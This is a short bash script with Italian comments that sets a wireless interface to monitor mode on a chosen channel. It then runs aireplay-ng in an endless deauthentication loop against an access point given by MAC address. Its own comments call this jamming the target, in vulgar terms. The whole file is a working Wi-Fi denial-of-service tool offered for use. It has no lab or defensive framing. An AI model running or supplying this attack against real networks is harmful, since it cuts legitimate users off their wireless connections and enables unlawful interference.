#!/bin/bash

#Help
if [ "$1" == "-h" ]; then
  echo "Ordine parametri: MAC INTERFACCIA CANALE"
  exit 0
fi


#Controllo se l'utente è root
if [ “$(id -u)” != “0” ]; then
tput setaf 1; tput bold; echo -e '\nQuesto script va avviato come root\n' 2>&1
exit 1
fi

clear
echo -e "\nQuesta è una fottuta branda"
echo "Cerca di essere ben sicuro di startare sul giusto AP"
echo "Rompere i coglioni a ${1} con interfaccia ${2} canale ${3}?"
echo
read -p "Premi un tasto per continuare"
clear

#Controllo la modalità monitor
statowlan=$(iwconfig $2 |grep -o "Mode:Monitor")
if [ -z "$statowlan" ]; then

tput setaf 2; tput bold;
echo "Interfaccia down..."
ip link set $2 down || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a disattivare l'adattatore di rete" ; exit 1; }
echo "iwconfig monitor..."
iwconfig $2 mode monitor || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco ad inizializzare la modalità monitor" ; exit 1; }
echo "Interfaccia up..."
ip link set $2 up || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a riattivare l'adattatore di rete" ; exit 1; }
tput reset
fi

#Inizio a jammerare
iwconfig $2 channel $3 || { tput setaf 1; tput bold; echo -e "\nErrore: non riesco a cambiare canale" ; exit 1; }
aireplay-ng -0 0 -a $1 $2 || { tput setaf 1; tput bold; echo -e "\nErrore: Qualcosa è andato storto" ; exit 1; }
